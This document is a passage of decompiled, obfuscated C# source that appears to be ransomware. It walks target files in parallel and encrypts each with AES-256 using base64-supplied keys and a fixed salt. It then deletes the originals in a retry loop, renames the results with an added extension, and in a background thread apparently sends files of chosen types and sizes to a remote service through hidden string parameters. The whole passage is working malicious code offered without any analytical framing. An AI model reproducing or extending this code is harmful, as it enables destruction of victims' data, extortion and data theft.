		MIWsSuEMIryyp.XbaJUSLINbQ CS_0024_003C_003E8__locals0 = new MIWsSuEMIryyp();
		CS_0024_003C_003E8__locals0.CUuOmmxXYbdtCA = list_0;
		CS_0024_003C_003E8__locals0.hJijbCOiRyyoj = string_1;
		CS_0024_003C_003E8__locals0.XnYPhviXEFMTAt = string_2;
		CS_0024_003C_003E8__locals0.yifqLwxnUift = string_3;
		CS_0024_003C_003E8__locals0.aYHHSmaEaZH = new List<string> { getString_0(107386328) };
		if (aKVrenHUiYNV == getString_0(107396725))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.CUuOmmxXYbdtCA)
				{
					if (CS_0024_003C_003E8__locals0.XnYPhviXEFMTAt.Length != 0)
					{
						string[] xnYPhviXEFMTAt2 = CS_0024_003C_003E8__locals0.XnYPhviXEFMTAt;
						int num2 = 0;
						while (num2 < xnYPhviXEFMTAt2.Length)
						{
							string value2 = xnYPhviXEFMTAt2[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_0987;
						}
					}
					try
					{
						if (item.EndsWith(CS_0024_003C_003E8__locals0.hJijbCOiRyyoj))
						{
							goto IL_0987;
						}
					}
					catch (Exception)
					{
						goto IL_0987;
					}
					if (item.EndsWith(string_0) && !aacDzVOnoKU.Contains(item))
					{
						if (nUcCUJIepUVWBM == MIWsSuEMIryyp.getString_0(107396849))
						{
							try
							{
								if (xhISZmOqgVfP.SyQDXJZMiVcpJ(item))
								{
									xhISZmOqgVfP.TyPIvAqBtcBzN(item);
								}
							}
							catch
							{
							}
						}
						aacDzVOnoKU.Add(item);
						if (!DhgHRwHTnLl.Contains(Path.GetDirectoryName(item)))
						{
							DhgHRwHTnLl.Add(Path.GetDirectoryName(item));
						}
						qutpUeZZrAG(item);
						try
						{
							new EKxCzvGOtOOlKz().jKBwrfyEeHsIKw(item);
						}
						catch
						{
						}
						try
						{
							using FileStream fileStream2 = new FileStream(item, FileMode.Open, FileAccess.Write);
							if (!fileStream2.CanWrite)
							{
								try
								{
									if (vgTZYvMerotpU)
									{
										Console.WriteLine(MIWsSuEMIryyp.getString_0(107400203) + item + MIWsSuEMIryyp.getString_0(107400190) + new FileInfo(item).Length + MIWsSuEMIryyp.getString_0(107400169));
										Console.WriteLine(MIWsSuEMIryyp.getString_0(107400160));
									}
								}
								catch
								{
								}
								gzgGVgooFWELQWZ(VzYMPTFsHuw(MIWsSuEMIryyp.getString_0(107399511)), MIWsSuEMIryyp.getString_0(107384653) + item + MIWsSuEMIryyp.getString_0(107384653) + VzYMPTFsHuw(MIWsSuEMIryyp.getString_0(107399518)) + MIWsSuEMIryyp.getString_0(107384653) + Environment.UserName + MIWsSuEMIryyp.getString_0(107384653) + VzYMPTFsHuw(MIWsSuEMIryyp.getString_0(107399469)));
							}
						}
						catch (Exception ex12)
						{
							if (XtQtDAAqcssaA)
							{
								try
								{
									File.AppendAllText(IuaKWfBuBpJ, MIWsSuEMIryyp.getString_0(107383179) + item + MIWsSuEMIryyp.getString_0(107399444) + ex12.Message + MIWsSuEMIryyp.getString_0(107395774));
								}
								catch (Exception)
								{
								}
							}
							continue;
						}
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_02f0;
								}
								goto end_IL_02ef;
								end_IL_02f0:;
							}
							catch (Exception ex12)
							{
								if (XtQtDAAqcssaA)
								{
									try
									{
										File.AppendAllText(IuaKWfBuBpJ, MIWsSuEMIryyp.getString_0(107383179) + item + MIWsSuEMIryyp.getString_0(107399395) + ex12.Message + MIWsSuEMIryyp.getString_0(107395774));
									}
									catch (Exception)
									{
									}
								}
								azNcSbADWgl++;
								goto end_IL_02ef;
							}
							byte[] bytes2;
							if (!(yKirRorQtiUWa == MIWsSuEMIryyp.getString_0(107396849)) || new FileInfo(item).Length <= Convert.ToInt32(OLieTsrCJKKkG) * 1024 * 1024 || CS_0024_003C_003E8__locals0.aYHHSmaEaZH.Contains(string_0))
							{
								if (MNVRxjtsYUxy)
								{
									CS_0024_003C_003E8__locals0.hJijbCOiRyyoj = WesWtWKgSJxOqJ + CS_0024_003C_003E8__locals0.hJijbCOiRyyoj;
								}
								bytes2 = Encoding.ASCII.GetBytes(kqGxspAqmKwYfMRE);
								if (CS_0024_003C_003E8__locals0.hJijbCOiRyyoj != MIWsSuEMIryyp.getString_0(107382415))
								{
									if (!TBRkxWpRCztklVA)
									{
										if (!VSeBsFuIKiNqF)
										{
											yGIPnmDWDLY(item, item + CS_0024_003C_003E8__locals0.hJijbCOiRyyoj, LGcIAPIHUXZNO);
										}
										else
										{
											yGIPnmDWDLY(item, item + CS_0024_003C_003E8__locals0.hJijbCOiRyyoj, Convert.FromBase64String(CS_0024_003C_003E8__locals0.yifqLwxnUift));
										}
									}
									else
									{
										try
										{
											if (!VSeBsFuIKiNqF)
											{
												awipvienyInhBz(item, item + CS_0024_003C_003E8__locals0.hJijbCOiRyyoj, LGcIAPIHUXZNO, Convert.FromBase64String(lASimeaIGcCh));
											}
											else
											{
												awipvienyInhBz(item, item + CS_0024_003C_003E8__locals0.hJijbCOiRyyoj, Convert.FromBase64String(CS_0024_003C_003E8__locals0.yifqLwxnUift), Convert.FromBase64String(lASimeaIGcCh));
											}
										}
										catch (Exception ex12)
										{
											if (XtQtDAAqcssaA)
											{
												try
												{
													File.AppendAllText(IuaKWfBuBpJ, MIWsSuEMIryyp.getString_0(107383179) + item + MIWsSuEMIryyp.getString_0(107382433) + ex12.Message + MIWsSuEMIryyp.getString_0(107395774));
												}
												catch (Exception)
												{
												}
											}
											azNcSbADWgl++;
											try
											{
												File.Move(item + CS_0024_003C_003E8__locals0.hJijbCOiRyyoj, item);
											}
											catch (Exception)
											{
											}
											goto end_IL_02ef;
										}
									}
								}
								else if (!TBRkxWpRCztklVA)
								{
									if (!VSeBsFuIKiNqF)
									{
										yGIPnmDWDLY(item, item + MIWsSuEMIryyp.getString_0(107382442), LGcIAPIHUXZNO);
									}
									else
									{
										yGIPnmDWDLY(item, item + MIWsSuEMIryyp.getString_0(107382442), Convert.FromBase64String(CS_0024_003C_003E8__locals0.yifqLwxnUift));
									}
								}
								else
								{
									try
									{
										if (!VSeBsFuIKiNqF)
										{
											awipvienyInhBz(item, item, LGcIAPIHUXZNO, Convert.FromBase64String(lASimeaIGcCh));
										}
										else
										{
											awipvienyInhBz(item, item, Convert.FromBase64String(CS_0024_003C_003E8__locals0.yifqLwxnUift), Convert.FromBase64String(lASimeaIGcCh));
										}
									}
									catch (Exception ex12)
									{
										if (XtQtDAAqcssaA)
										{
											try
											{
												File.AppendAllText(IuaKWfBuBpJ, MIWsSuEMIryyp.getString_0(107383179) + item + MIWsSuEMIryyp.getString_0(107382433) + ex12.Message + MIWsSuEMIryyp.getString_0(107395774));
											}
											catch (Exception)
											{
											}
										}
										azNcSbADWgl++;
										goto end_IL_02ef;
									}
								}
								if (VSeBsFuIKiNqF)
								{
									if (CS_0024_003C_003E8__locals0.hJijbCOiRyyoj != MIWsSuEMIryyp.getString_0(107382415))
									{
										mkjUeNwAcldzu(item + CS_0024_003C_003E8__locals0.hJijbCOiRyyoj, bytes2);
									}
									else
									{
										mkjUeNwAcldzu(item, bytes2);
									}
								}
								goto IL_0987;
							}
							CS_0024_003C_003E8__locals0 = new MIWsSuEMIryyp.ekzjBCvFZx();
							CS_0024_003C_003E8__locals0.mFDLzGHrXSuJRBu = CS_0024_003C_003E8__locals0;
							try
							{
								if (CS_0024_003C_003E8__locals0.hJijbCOiRyyoj != MIWsSuEMIryyp.getString_0(107382415))
								{
									if (MNVRxjtsYUxy)
									{
										CS_0024_003C_003E8__locals0.hJijbCOiRyyoj = WesWtWKgSJxOqJ + CS_0024_003C_003E8__locals0.hJijbCOiRyyoj;
									}
									File.Move(item, item + CS_0024_003C_003E8__locals0.hJijbCOiRyyoj);
								}
							}
							catch (Exception ex12)
							{
								if (XtQtDAAqcssaA)
								{
									try
									{
										File.AppendAllText(IuaKWfBuBpJ, MIWsSuEMIryyp.getString_0(107383179) + item + MIWsSuEMIryyp.getString_0(107399334) + ex12.Message + MIWsSuEMIryyp.getString_0(107395774));
									}
									catch (Exception)
									{
									}
								}
								azNcSbADWgl++;
								goto end_IL_02ef;
							}
							CS_0024_003C_003E8__locals0.popfiosTtsUtLa = MIWsSuEMIryyp.getString_0(107386347);
							if (CS_0024_003C_003E8__locals0.hJijbCOiRyyoj != MIWsSuEMIryyp.getString_0(107382415))
							{
								CS_0024_003C_003E8__locals0.popfiosTtsUtLa = item + CS_0024_003C_003E8__locals0.hJijbCOiRyyoj;
							}
							else
							{
								CS_0024_003C_003E8__locals0.popfiosTtsUtLa = item;
							}
							if (OULbCWoifC == MIWsSuEMIryyp.getString_0(107396849))
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									foreach (string item2 in QrfGnpJnAuCjH)
									{
										if (CS_0024_003C_003E8__locals0.popfiosTtsUtLa.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.mFDLzGHrXSuJRBu.hJijbCOiRyyoj) && cfLqyLJDABPGnW == MIWsSuEMIryyp.ekzjBCvFZx.getString_0(107396852))
										{
											if (Convert.ToInt32(IAXzEIcMsJCbe) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.popfiosTtsUtLa).Length)
											{
												try
												{
													chuLHDnVuoGm.XEbKwrzWPjZipB(MIWsSuEMIryyp.ekzjBCvFZx.getString_0(107386463), MIWsSuEMIryyp.ekzjBCvFZx.getString_0(107386426), MIWsSuEMIryyp.ekzjBCvFZx.getString_0(107386445), CS_0024_003C_003E8__locals0.popfiosTtsUtLa);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.popfiosTtsUtLa.ToLower().EndsWith(item2) && cfLqyLJDABPGnW == MIWsSuEMIryyp.ekzjBCvFZx.getString_0(107396747))
										{
											try
											{
												chuLHDnVuoGm.XEbKwrzWPjZipB(MIWsSuEMIryyp.ekzjBCvFZx.getString_0(107386463), MIWsSuEMIryyp.ekzjBCvFZx.getString_0(107386426), MIWsSuEMIryyp.ekzjBCvFZx.getString_0(107386445), CS_0024_003C_003E8__locals0.popfiosTtsUtLa);
											}
											catch
											{
											}
										}
									}
								});
								thread2.Priority = ThreadPriority.Normal;
								thread2.IsBackground = false;
								thread2.Start();
							}
							bytes2 = Encoding.ASCII.GetBytes(kqGxspAqmKwYfMRE);
							byte[] array2 = null;
							byte[] byte_2 = nTOXQbVewSXTFiv.zyRLkdiKoM(CS_0024_003C_003E8__locals0.popfiosTtsUtLa, Convert.ToInt32(OLieTsrCJKKkG) * 1024 * 1024);
							if (nTOXQbVewSXTFiv.nzAnvDfCOCtBIgh(qvpNQzoNrMBw: (!EwFuVhMNxUkHL) ? (VSeBsFuIKiNqF ? nTOXQbVewSXTFiv.LFBNnGzEowO(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.yifqLwxnUift), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : nTOXQbVewSXTFiv.LFBNnGzEowO(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.yifqLwxnUift), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (VSeBsFuIKiNqF ? TzDtpbVJUP.XeximicAtk(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.yifqLwxnUift), Convert.FromBase64String(lASimeaIGcCh)) : TzDtpbVJUP.XeximicAtk(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.yifqLwxnUift), Convert.FromBase64String(lASimeaIGcCh))), sEnEvTXbkUj: CS_0024_003C_003E8__locals0.popfiosTtsUtLa, aBOyLyAioGlSxs: bytes2))
							{
								goto IL_0987;
							}
							try
							{
								File.Move(item + CS_0024_003C_003E8__locals0.hJijbCOiRyyoj, item);
							}
							catch (Exception)
							{
							}
							end_IL_02ef:;
						}
						catch (Exception)
						{
							goto IL_0987;
						}
					}
					continue;
					IL_0987:
					CS_0024_003C_003E8__locals0.CUuOmmxXYbdtCA.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.CUuOmmxXYbdtCA, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new MIWsSuEMIryyp.XbaJUSLINbQ();
			CS_0024_003C_003E8__locals0.mFDLzGHrXSuJRBu = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.nLhTwbRovRDpH = string_0;
			if (CS_0024_003C_003E8__locals0.XnYPhviXEFMTAt.Length != 0)
			{
				string[] xnYPhviXEFMTAt = CS_0024_003C_003E8__locals0.XnYPhviXEFMTAt;
				int num = 0;
				while (num < xnYPhviXEFMTAt.Length)
				{
					string value = xnYPhviXEFMTAt[num];
					if (!CS_0024_003C_003E8__locals0.nLhTwbRovRDpH.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0a1f;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.nLhTwbRovRDpH.EndsWith(CS_0024_003C_003E8__locals0.hJijbCOiRyyoj))
				{
					goto IL_0a1f;
				}
			}
			catch (Exception)
			{
				goto IL_0a1f;
			}
			if (!aacDzVOnoKU.Contains(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH))
			{
				if (nUcCUJIepUVWBM == MIWsSuEMIryyp.getString_0(107396849))
				{
					try
					{
						if (xhISZmOqgVfP.SyQDXJZMiVcpJ(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH))
						{
							xhISZmOqgVfP.TyPIvAqBtcBzN(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH);
						}
					}
					catch
					{
					}
				}
				aacDzVOnoKU.Add(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH);
				if (!DhgHRwHTnLl.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH)))
				{
					DhgHRwHTnLl.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH));
				}
				qutpUeZZrAG(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH);
				try
				{
					new EKxCzvGOtOOlKz().jKBwrfyEeHsIKw(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (vgTZYvMerotpU)
							{
								Console.WriteLine(MIWsSuEMIryyp.getString_0(107400203) + CS_0024_003C_003E8__locals0.nLhTwbRovRDpH + MIWsSuEMIryyp.getString_0(107400190) + new FileInfo(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH).Length + MIWsSuEMIryyp.getString_0(107400169));
								Console.WriteLine(MIWsSuEMIryyp.getString_0(107400160));
							}
						}
						catch
						{
						}
						gzgGVgooFWELQWZ(VzYMPTFsHuw(MIWsSuEMIryyp.getString_0(107399511)), MIWsSuEMIryyp.getString_0(107384653) + CS_0024_003C_003E8__locals0.nLhTwbRovRDpH + MIWsSuEMIryyp.getString_0(107384653) + VzYMPTFsHuw(MIWsSuEMIryyp.getString_0(107399518)) + MIWsSuEMIryyp.getString_0(107384653) + Environment.UserName + MIWsSuEMIryyp.getString_0(107384653) + VzYMPTFsHuw(MIWsSuEMIryyp.getString_0(107399469)));
					}
				}
				catch (Exception ex2)
				{
					if (XtQtDAAqcssaA)
					{
						try
						{
							File.AppendAllText(IuaKWfBuBpJ, MIWsSuEMIryyp.getString_0(107383179) + CS_0024_003C_003E8__locals0.nLhTwbRovRDpH + MIWsSuEMIryyp.getString_0(107399444) + ex2.Message + MIWsSuEMIryyp.getString_0(107395774));
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH).Length != 0L)
						{
							goto end_IL_032e;
						}
						goto end_IL_032d;
						end_IL_032e:;
					}
					catch (Exception ex2)
					{
						if (XtQtDAAqcssaA)
						{
							try
							{
								File.AppendAllText(IuaKWfBuBpJ, MIWsSuEMIryyp.getString_0(107383179) + CS_0024_003C_003E8__locals0.nLhTwbRovRDpH + MIWsSuEMIryyp.getString_0(107399395) + ex2.Message + MIWsSuEMIryyp.getString_0(107395774));
							}
							catch (Exception)
							{
							}
						}
						azNcSbADWgl++;
						goto end_IL_032d;
					}
					if (yKirRorQtiUWa == MIWsSuEMIryyp.getString_0(107396849) && new FileInfo(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH).Length > Convert.ToInt32(OLieTsrCJKKkG) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.hJijbCOiRyyoj != MIWsSuEMIryyp.getString_0(107382415))
							{
								if (MNVRxjtsYUxy)
								{
									CS_0024_003C_003E8__locals0.hJijbCOiRyyoj = WesWtWKgSJxOqJ + CS_0024_003C_003E8__locals0.hJijbCOiRyyoj;
								}
								File.Move(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH, CS_0024_003C_003E8__locals0.nLhTwbRovRDpH + CS_0024_003C_003E8__locals0.hJijbCOiRyyoj);
							}
						}
						catch (Exception ex2)
						{
							if (XtQtDAAqcssaA)
							{
								try
								{
									File.AppendAllText(IuaKWfBuBpJ, MIWsSuEMIryyp.getString_0(107383179) + CS_0024_003C_003E8__locals0.nLhTwbRovRDpH + MIWsSuEMIryyp.getString_0(107399334) + ex2.Message + MIWsSuEMIryyp.getString_0(107395774));
								}
								catch (Exception)
								{
								}
							}
							azNcSbADWgl++;
							return;
						}
						if (CS_0024_003C_003E8__locals0.hJijbCOiRyyoj != MIWsSuEMIryyp.getString_0(107382415))
						{
							CS_0024_003C_003E8__locals0.nLhTwbRovRDpH += CS_0024_003C_003E8__locals0.hJijbCOiRyyoj;
						}
						if (OULbCWoifC == MIWsSuEMIryyp.getString_0(107396849))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in QrfGnpJnAuCjH)
								{
									if (CS_0024_003C_003E8__locals0.nLhTwbRovRDpH.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.mFDLzGHrXSuJRBu.hJijbCOiRyyoj) && cfLqyLJDABPGnW == MIWsSuEMIryyp.XbaJUSLINbQ.getString_0(107396855))
									{
										if (Convert.ToInt32(IAXzEIcMsJCbe) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH).Length)
										{
											try
											{
												chuLHDnVuoGm.XEbKwrzWPjZipB(MIWsSuEMIryyp.XbaJUSLINbQ.getString_0(107386466), MIWsSuEMIryyp.XbaJUSLINbQ.getString_0(107386429), MIWsSuEMIryyp.XbaJUSLINbQ.getString_0(107386448), CS_0024_003C_003E8__locals0.nLhTwbRovRDpH);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.nLhTwbRovRDpH.ToLower().EndsWith(item3) && cfLqyLJDABPGnW == MIWsSuEMIryyp.XbaJUSLINbQ.getString_0(107396750))
									{
										try
										{
											chuLHDnVuoGm.XEbKwrzWPjZipB(MIWsSuEMIryyp.XbaJUSLINbQ.getString_0(107386466), MIWsSuEMIryyp.XbaJUSLINbQ.getString_0(107386429), MIWsSuEMIryyp.XbaJUSLINbQ.getString_0(107386448), CS_0024_003C_003E8__locals0.nLhTwbRovRDpH);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						byte[] bytes = Encoding.ASCII.GetBytes(kqGxspAqmKwYfMRE);
						byte[] array = null;
						byte[] byte_ = nTOXQbVewSXTFiv.zyRLkdiKoM(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH, Convert.ToInt32(OLieTsrCJKKkG) * 1024 * 1024);
						if (!nTOXQbVewSXTFiv.nzAnvDfCOCtBIgh(qvpNQzoNrMBw: (!EwFuVhMNxUkHL) ? (VSeBsFuIKiNqF ? nTOXQbVewSXTFiv.LFBNnGzEowO(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.yifqLwxnUift), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : nTOXQbVewSXTFiv.LFBNnGzEowO(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.yifqLwxnUift), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (VSeBsFuIKiNqF ? TzDtpbVJUP.XeximicAtk(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.yifqLwxnUift), Convert.FromBase64String(lASimeaIGcCh)) : TzDtpbVJUP.XeximicAtk(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.yifqLwxnUift), Convert.FromBase64String(lASimeaIGcCh))), sEnEvTXbkUj: CS_0024_003C_003E8__locals0.nLhTwbRovRDpH, aBOyLyAioGlSxs: bytes))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH + CS_0024_003C_003E8__locals0.hJijbCOiRyyoj, CS_0024_003C_003E8__locals0.nLhTwbRovRDpH);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (MNVRxjtsYUxy)
						{
							CS_0024_003C_003E8__locals0.hJijbCOiRyyoj = WesWtWKgSJxOqJ + CS_0024_003C_003E8__locals0.hJijbCOiRyyoj;
						}
						byte[] bytes = Encoding.ASCII.GetBytes(kqGxspAqmKwYfMRE);
						if (CS_0024_003C_003E8__locals0.hJijbCOiRyyoj != MIWsSuEMIryyp.getString_0(107382415))
						{
							if (!TBRkxWpRCztklVA)
							{
								if (!VSeBsFuIKiNqF)
								{
									yGIPnmDWDLY(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH, CS_0024_003C_003E8__locals0.nLhTwbRovRDpH + CS_0024_003C_003E8__locals0.hJijbCOiRyyoj, LGcIAPIHUXZNO);
								}
								else
								{
									yGIPnmDWDLY(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH, CS_0024_003C_003E8__locals0.nLhTwbRovRDpH + CS_0024_003C_003E8__locals0.hJijbCOiRyyoj, Convert.FromBase64String(CS_0024_003C_003E8__locals0.yifqLwxnUift));
								}
							}
							else
							{
								try
								{
									if (!VSeBsFuIKiNqF)
									{
										awipvienyInhBz(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH, CS_0024_003C_003E8__locals0.nLhTwbRovRDpH + CS_0024_003C_003E8__locals0.hJijbCOiRyyoj, LGcIAPIHUXZNO, Convert.FromBase64String(lASimeaIGcCh));
									}
									else
									{
										awipvienyInhBz(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH, CS_0024_003C_003E8__locals0.nLhTwbRovRDpH + CS_0024_003C_003E8__locals0.hJijbCOiRyyoj, Convert.FromBase64String(CS_0024_003C_003E8__locals0.yifqLwxnUift), Convert.FromBase64String(lASimeaIGcCh));
									}
								}
								catch (Exception ex2)
								{
									if (XtQtDAAqcssaA)
									{
										try
										{
											File.AppendAllText(IuaKWfBuBpJ, MIWsSuEMIryyp.getString_0(107383179) + CS_0024_003C_003E8__locals0.nLhTwbRovRDpH + MIWsSuEMIryyp.getString_0(107382433) + ex2.Message + MIWsSuEMIryyp.getString_0(107395774));
										}
										catch (Exception)
										{
										}
									}
									azNcSbADWgl++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH + CS_0024_003C_003E8__locals0.hJijbCOiRyyoj, CS_0024_003C_003E8__locals0.nLhTwbRovRDpH);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!TBRkxWpRCztklVA)
						{
							if (!VSeBsFuIKiNqF)
							{
								yGIPnmDWDLY(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH, CS_0024_003C_003E8__locals0.nLhTwbRovRDpH + MIWsSuEMIryyp.getString_0(107382442), LGcIAPIHUXZNO);
							}
							else
							{
								yGIPnmDWDLY(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH, CS_0024_003C_003E8__locals0.nLhTwbRovRDpH + MIWsSuEMIryyp.getString_0(107382442), Convert.FromBase64String(CS_0024_003C_003E8__locals0.yifqLwxnUift));
							}
						}
						else
						{
							try
							{
								if (!VSeBsFuIKiNqF)
								{
									awipvienyInhBz(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH, CS_0024_003C_003E8__locals0.nLhTwbRovRDpH, LGcIAPIHUXZNO, Convert.FromBase64String(lASimeaIGcCh));
								}
								else
								{
									awipvienyInhBz(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH, CS_0024_003C_003E8__locals0.nLhTwbRovRDpH, Convert.FromBase64String(CS_0024_003C_003E8__locals0.yifqLwxnUift), Convert.FromBase64String(lASimeaIGcCh));
								}
							}
							catch (Exception ex2)
							{
								if (XtQtDAAqcssaA)
								{
									try
									{
										File.AppendAllText(IuaKWfBuBpJ, MIWsSuEMIryyp.getString_0(107383179) + CS_0024_003C_003E8__locals0.nLhTwbRovRDpH + MIWsSuEMIryyp.getString_0(107382433) + ex2.Message + MIWsSuEMIryyp.getString_0(107395774));
									}
									catch (Exception)
									{
									}
								}
								azNcSbADWgl++;
								return;
							}
						}
						if (VSeBsFuIKiNqF)
						{
							if (CS_0024_003C_003E8__locals0.hJijbCOiRyyoj != MIWsSuEMIryyp.getString_0(107382415))
							{
								mkjUeNwAcldzu(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH + CS_0024_003C_003E8__locals0.hJijbCOiRyyoj, bytes);
							}
							else
							{
								mkjUeNwAcldzu(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH, bytes);
							}
						}
					}
					end_IL_032d:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0a1f;
			IL_0a1f:
			CS_0024_003C_003E8__locals0.CUuOmmxXYbdtCA.Remove(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH);
		});
	}

	private static void dEBoJFJUsggx(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (OULbCWoifC == getString_0(107396830))
					{
						foreach (string item in QrfGnpJnAuCjH)
						{
							if (string_0.ToLower().EndsWith(item) && cfLqyLJDABPGnW == getString_0(107396830))
							{
								if (Convert.ToInt32(IAXzEIcMsJCbe) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										chuLHDnVuoGm.XEbKwrzWPjZipB(getString_0(107386441), getString_0(107386404), getString_0(107386423), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && cfLqyLJDABPGnW == getString_0(107396725))
							{
								try
								{
									chuLHDnVuoGm.XEbKwrzWPjZipB(getString_0(107386441), getString_0(107386404), getString_0(107386423), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107382423)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107382423), getString_0(107386328)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void awipvienyInhBz(string JtKutskkjnJ, string JPhgdOUZWP, byte[] cuNUCjpZvCIgyI, byte[] VuTXkwvzLJ = null)
	{
		try
		{
			if (OULbCWoifC == getString_0(107396830))
			{
				FileStream fileStream = new FileStream(JtKutskkjnJ, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in QrfGnpJnAuCjH)
				{
					if (JtKutskkjnJ.ToLower().EndsWith(item) && cfLqyLJDABPGnW == getString_0(107396830))
					{
						if (Convert.ToInt32(IAXzEIcMsJCbe) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								chuLHDnVuoGm.XEbKwrzWPjZipB(getString_0(107386441), getString_0(107386404), getString_0(107386423), JtKutskkjnJ);
							}
							catch
							{
							}
						}
					}
					else if (JtKutskkjnJ.ToLower().EndsWith(item) && cfLqyLJDABPGnW == getString_0(107396725))
					{
						try
						{
							chuLHDnVuoGm.XEbKwrzWPjZipB(getString_0(107386441), getString_0(107386404), getString_0(107386423), JtKutskkjnJ);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (JtKutskkjnJ != JPhgdOUZWP)
		{
			File.Move(JtKutskkjnJ, JPhgdOUZWP);
			JtKutskkjnJ = JPhgdOUZWP;
		}
